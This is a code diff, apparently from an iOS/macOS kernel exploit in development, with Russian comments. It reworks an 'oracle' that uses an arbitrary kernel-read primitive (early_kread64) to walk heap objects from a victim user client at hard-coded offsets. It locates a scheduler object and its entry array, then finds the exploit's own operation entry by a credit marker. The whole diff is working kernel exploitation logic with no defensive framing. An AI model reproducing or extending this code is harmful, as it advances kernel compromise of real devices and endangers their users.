@@ -6068,31 +6068,67 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // каждый проверяем surfFast (pfn-цепочка = железная правда backingPA). Окно:
     // churn-backlog держит workloop ≈30-50мс, запись жива до execute.
     if (!surfVA && isTable && victim != IO_OBJECT_NULL) {
+        // 1.9.148: весь оракул на early_kread64 — kpRead флаки ровно на zone-map,
+        // где живут client/scheduler (причина scheduler=0 в 1.9.147). Цепочка
+        // из раунда 2: [UC+0xe8] → объект → [объект+0xb8] = scheduler; плюс
+        // двухуровневый layout-скан (cnt@+0xb8, массивы @+0xc8/+0x110).
         uint64_t vcVA = kpM2TClientVA(r, isTable, victim, @"paswap-victim");
         uint64_t schedVA = 0;
+        uint64_t (^schedIfLayout)(uint64_t) = ^uint64_t(uint64_t c) {
+            if (!kpLooksLikeKernelPointer(c)) return (uint64_t)0;
+            uint64_t cnt = early_kread64(c + 0xb8);
+            uint64_t a1 = kp_untag_ptr(early_kread64(c + 0xc8));
+            uint64_t a2 = kp_untag_ptr(early_kread64(c + 0x110));
+            if (cnt > 0x2000) return (uint64_t)0;
+            if (!kpLooksLikeKernelPointer(a1) || !kpLooksLikeKernelPointer(a2)) return (uint64_t)0;
+            return c;
+        };
         if (vcVA) {
-            uint64_t cand[24];
-            uint32_t cn = kpM2OCollectPtrs(vcVA, 0x168, cand, 24, r);
-            for (uint32_t i = 0; i < cn && !schedVA; i++) {
-                uint64_t cnt = 0, a1 = 0, a2 = 0;
-                if (!kpRead(cand[i] + 0xb8, &cnt, 8, "ps sch+b8", r)) continue;
-                if (!kpRead(cand[i] + 0xc8, &a1, 8, "ps sch+c8", r)) continue;
-                if (!kpRead(cand[i] + 0x110, &a2, 8, "ps sch+110", r)) continue;
-                a1 = kp_untag_ptr(a1);
-                a2 = kp_untag_ptr(a2);
-                if (cnt > 0x2000) continue;
-                if (!kpLooksLikeKernelPointer(a1) || !kpLooksLikeKernelPointer(a2)) continue;
-                schedVA = cand[i];
+            uint64_t obj = kp_untag_ptr(early_kread64(vcVA + 0xe8));
+            schedVA = schedIfLayout(kp_untag_ptr(early_kread64(obj + 0xb8)));
+            if (!schedVA) schedVA = schedIfLayout(obj);
+            uint64_t cand[32];
+            uint32_t cn = 0;
+            if (!schedVA) {
+                for (uint32_t o = 0; o + 8 <= 0x168 && cn < 32; o += 8) {
+                    uint64_t p = kp_untag_ptr(early_kread64(vcVA + o));
+                    if (!kpLooksLikeKernelPointer(p)) continue;
+                    BOOL dup = NO;
+                    for (uint32_t k = 0; k < cn; k++) if (cand[k] == p) { dup = YES; break; }
+                    if (!dup) cand[cn++] = p;
+                }
+                for (uint32_t i = 0; i < cn && !schedVA; i++) {
+                    if ((schedVA = schedIfLayout(cand[i]))) break;
+                    // уровень 2: указатели внутри кандидата
+                    for (uint32_t o = 0; o + 8 <= 0x200 && !schedVA; o += 8) {
+                        uint64_t p2 = kp_untag_ptr(early_kread64(cand[i] + o));
+                        if (p2 && kpLooksLikeKernelPointer(p2)) schedVA = schedIfLayout(p2);
+                    }
+                }
             }
+            kpNote(r, [NSString stringWithFormat:@"  op-entry oracle: clientVA=%#llx obj(+0xe8)=%#llx scheduler=%#llx (кандидатов=%u)",
+                      (unsigned long long)vcVA, (unsigned long long)obj, (unsigned long long)schedVA, cn]);
         }
-        kpNote(r, [NSString stringWithFormat:@"  op-entry oracle: clientVA=%#llx scheduler=%#llx",
-                  (unsigned long long)vcVA, (unsigned long long)schedVA]);
         if (schedVA) {
+            uint64_t cnt = early_kread64(schedVA + 0xb8);
+            uint64_t arr = kp_untag_ptr(early_kread64(schedVA + 0xc8));
             uint64_t eptrs[384];
-            uint32_t eN = kpM2OCollectEntries(schedVA, eptrs, 384, r);
-            kpNote(r, [NSString stringWithFormat:@"  entry-array: %u записей — ищу credit +0xc3c==0x10", eN]);
+            uint32_t eN = 0;
+            if (kpLooksLikeKernelPointer(arr) && cnt && cnt <= 384) {
+                for (uint64_t i = 0; i < cnt && eN < 384; i++) {
+                    uint64_t p = kp_untag_ptr(early_kread64(arr + i * 8));
+                    if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+                }
+            }
+            if (!eN) {
+                for (uint32_t o = 0xc8; o + 8 <= 0x1c8 && eN < 16; o += 8) {
+                    uint64_t p = kp_untag_ptr(early_kread64(schedVA + o));
+                    if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+                }
+            }
+            kpNote(r, [NSString stringWithFormat:@"  entry-array: %u записей (count=%llu) — ищу credit +0xc3c==0x10", eN, cnt]);
             for (uint32_t i = 0; i < eN && !surfVA; i++) {
-                if (!kpM2OMarkerAt(eptrs[i], 0xc3c, 0x10, r)) continue;
+                if ((uint32_t)(early_kread64(eptrs[i] + 0xc38) >> 32) != 0x10) continue;
                 uint64_t entryVA = eptrs[i];
                 kpNote(r, [NSString stringWithFormat:@"  ★ наша оп-запись @ %#llx (credit ✓) — указатели 0x21c0 с surfFast:",
                           (unsigned long long)entryVA]);
